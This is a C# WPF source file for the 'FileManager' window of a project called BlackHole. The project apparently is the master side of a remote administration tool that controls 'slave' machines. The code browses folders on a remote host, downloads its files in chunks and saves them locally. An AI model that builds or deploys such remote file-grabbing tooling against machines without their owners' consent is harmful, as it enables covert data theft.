using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class FileManager : ISlaveWindow
    {
        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<FileMeta> ViewModelFiles
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<FileTransaction> ViewModelFileTransactions
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public Slave Slave
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private int m_nextTransactionId, m_sucessfulTransactions;

        /// <summary>
        /// 
        /// </summary>
        private Queue<string> m_pendingDownloads;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public FileManager(Slave slave) : this()
        {
            m_pendingDownloads = new Queue<string>();

            Slave = slave;

            TargetStatusBar.DataContext = slave;

            FileTransactionsList.DataContext = ViewModelFileTransactions = new ViewModelCollection<FileTransaction>();
            FilesList.DataContext = ViewModelFiles = new ViewModelCollection<FileMeta>();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="folder"></param>
        private void NavigateToFolder(string folder)
        {
            this.Send(new NavigateToFolderMessage()
            {
                Path = Path.Combine(TxtBoxDirectory.Text, folder)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        private void DownloadFile(string name)
        {
            m_pendingDownloads.Enqueue(name);
            if (m_pendingDownloads.Count == 1)            
                ProcessNextDownload();            
        }

        /// <summary>
        /// 
        /// </summary>
        private void ProcessNextDownload()
        {
            if (m_pendingDownloads.Count == 0)
                return;

            var name = m_pendingDownloads.Dequeue();
            this.Send(new DownloadFilePartMessage()
            {
                Id = m_nextTransactionId++,
                CurrentPart = 0,
                Path = Path.Combine(TxtBoxDirectory.Text, name)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public async void OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<FolderNavigationMessage>(m =>
                            {
                                TxtBoxDirectory.Text = m.Path;
                                ViewModelFiles.Items.Clear();
                                m.Files.ForEach(ViewModelFiles.Items.Add);
                            })
                            .With<StatusUpdateMessage>(m =>
                            {
                                TargetStatus.Content = m.Operation;
                                TargetStatusTooltipTitle.Text = m.Operation;
                                TargetStatusTooltipMessage.Text = m.Message;
                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
                                TargetStatusTooltip.PlacementTarget = TargetStatus;
                                TargetStatusTooltip.IsOpen = true;
                            })
                            .With<DownloadedFilePartMessage>(m =>
                            {
                                UpdateFileTransaction<FileDownload>(m,
                                    (download) =>
                                    {
                                        var raw = download.RawFile.ToArray();
                                        Slave.SaveDownloadedFile(download.Name, raw);
                                        Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_DOWNLOADED, Slave, raw));
                                        ProcessNextDownload();
                                    },
                                    (download) => this.Send(new DownloadFilePartMessage()
                                    {
                                        Id = download.Id,
                                        Path = download.FilePath,
                                        CurrentPart = m.CurrentPart + 1 // get the next chunck
                                    }));
                            })
                            .With<DownloadFilePartMessage>(m =>
                            {
                                Utility.ExecuteComplexOperation( 
                                    () => CommonHelper.DownloadFilePart(m.Id, m.CurrentPart, m.Path),
                                    (downloadedPart) => 
                                    {
                                        UpdateFileTransaction<FileUpload>(downloadedPart,
                                            (upload) =>
                                            {
                                                Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_UPLOADED, Slave, upload.FilePath));
                                            },
                                            (upload) => this.Send(downloadedPart));                                        
                                    },
                                    (e) =>
                                    {
                                        Slave.SlaveEvents.PostEvent(
                                            new SlaveEvent(
                                                SlaveEventType.INCOMMING_MESSAGE,
                                                Slave,
                                                new StatusUpdateMessage()
                                                {
                                                    Operation = "File upload",
                                                    Success = false,
                                                    Message = e.Message
                                                }));
                                    });
                            });                        
                        break;
                }
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="part"></param>
        private void UpdateFileTransaction<T>(DownloadedFilePartMessage part, Action<T> onCompleted, Action<T> onContinue)
            where T : FileTransaction, new()
        {
            var model = FindOrCreateFileTransaction<T>(part);
            model.UpdateTransaction(part);
            if (model.Completed)
            {
                onCompleted(model);

                TotalTransaction.Content = "Total transactions : " + ++m_sucessfulTransactions;

                // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
                Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () => ViewModelFileTransactions.Items.Remove(model));
            }
            else
                onContinue(model);
        }
            
        /// <summary>
        /// 
        /// </summary>
        /// <param name="part"></param>
        /// <returns></returns>
        private T FindOrCreateFileTransaction<T>(DownloadedFilePartMessage part)
            where T : FileTransaction, new()
        {
            var model = FindFileTransaction<T>(part);
            if (model == null)
            {
                model = new T();
                model.Id = part.Id;
                model.FilePath = part.Path;
                ViewModelFileTransactions.Items.Add(model);
            }
            return model;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        private T FindFileTransaction<T>(DownloadedFilePartMessage part)
            where T : FileTransaction
            => ViewModelFileTransactions.Items.OfType<T>().FirstOrDefault(mod => mod.Id == part.Id);
    }
}
